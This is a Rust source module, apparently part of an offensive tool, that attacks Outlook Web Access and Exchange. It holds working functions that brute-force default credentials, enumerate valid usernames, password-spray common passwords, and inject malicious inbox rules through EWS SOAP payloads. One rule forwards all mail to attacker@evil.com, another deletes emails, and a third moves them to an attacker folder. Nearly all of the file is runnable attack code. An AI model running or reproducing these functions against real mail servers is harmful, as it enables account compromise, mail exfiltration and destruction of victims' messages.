use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OWA Credential Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let creds = [
        ("administrator", "password"), ("administrator", "P@ssw0rd"),
        ("administrator", "Welcome1"), ("administrator", "Password1"),
        ("admin", "admin"), ("admin", "password"),
        ("user", "user"), ("user", "password"),
        ("svc_account", "SVCpass123"), ("sql_svc", "Sqlpass123"),
        ("guest", "guest"), ("guest", ""),
    ];

    let owa_body = r#"<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{user}@target.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"#;

    for (user, pass) in &creds {
        let body = owa_body.replace("{user}", user);
        match client.post(url).basic_auth(user, Some(pass)).header("Content-Type", "text/xml").body(body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20}:{:20} — AUTH SUCCESS", "[+]".green().bold(), user, if pass.is_empty() { "(empty)" } else { pass });
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OWA User Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let users = [
        "administrator", "admin", "user", "test", "guest",
        "svc_account", "sql_svc", "backup", "operator",
        "helpdesk", "intern", "temp", "contractor",
    ];

    for user in &users {
        let body = format!(r#"<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{}@target.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"#, user);
        match client.post(url).header("Content-Type", "text/xml").body(body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 401 && text.contains("Invalid") {
                    println!("  {} {:20} — invalid user", "[-]".dimmed(), user);
                } else if status == 401 {
                    println!("  {} {:20} — valid user (auth required)", "[+]".green().bold(), user);
                } else if status == 200 {
                    println!("  {} {:20} — VALID USER", "[!]".red().bold(), user);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn spray(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OWA Password Spray", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let passwords = ["password", "Welcome1", "P@ssw0rd", "Password1", "123456", "Summer2024!", "Winter2024!", "Company123"];
    let users = ["administrator", "admin", "user", "svc_account", "helpdesk"];

    for pass in &passwords {
        let mut hits = 0u32;
        for user in &users {
            let body = format!(r#"<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{}@target.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"#, user);
            match client.post(url).basic_auth(user, Some(pass)).header("Content-Type", "text/xml").body(body).send().await {
                Ok(r) => {
                    if r.status().as_u16() == 200 {
                        println!("  {} {:20}:{:20} — SUCCESS", "[!]".red().bold(), user, pass);
                        hits += 1;
                    }
                }
                Err(_) => {}
            }
        }
        if hits == 0 {
            println!("  {} Password {:20} — no hits", "[-]".dimmed(), pass);
        }
    }

    Ok(())
}

pub async fn rule(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OWA Inbox Rule Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let rule_payloads = [
        ("Forward all", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><m:CreateItem xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"><m:Items><t:Rule xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><t:DisplayName>Forward All</t:DisplayName><t:Actions><t:ForwardToRecipients><t:Address>attacker@evil.com</t:Address></t:ForwardToRecipients></t:Actions></t:Rule></m:Items></m:CreateItem></soap:Body></soap:Envelope>"#),
        ("Delete emails", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><m:CreateItem xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"><m:Items><t:Rule xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><t:DisplayName>Cleanup</t:DisplayName><t:Actions><t:Delete/></t:Actions></t:Rule></m:Items></m:CreateItem></soap:Body></soap:Envelope>"#),
        ("Move to folder", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><m:CreateItem xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"><m:Items><t:Rule xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><t:DisplayName>Archive</t:DisplayName><t:Actions><t:MoveToFolder><t:FolderId Id="attacker"/></t:MoveToFolder></t:Actions></t:Rule></m:Items></m:CreateItem></soap:Body></soap:Envelope>"#),
    ];

    for (name, payload) in &rule_payloads {
        match client.post(url).header("Content-Type", "text/xml").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20} — RULE CREATED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
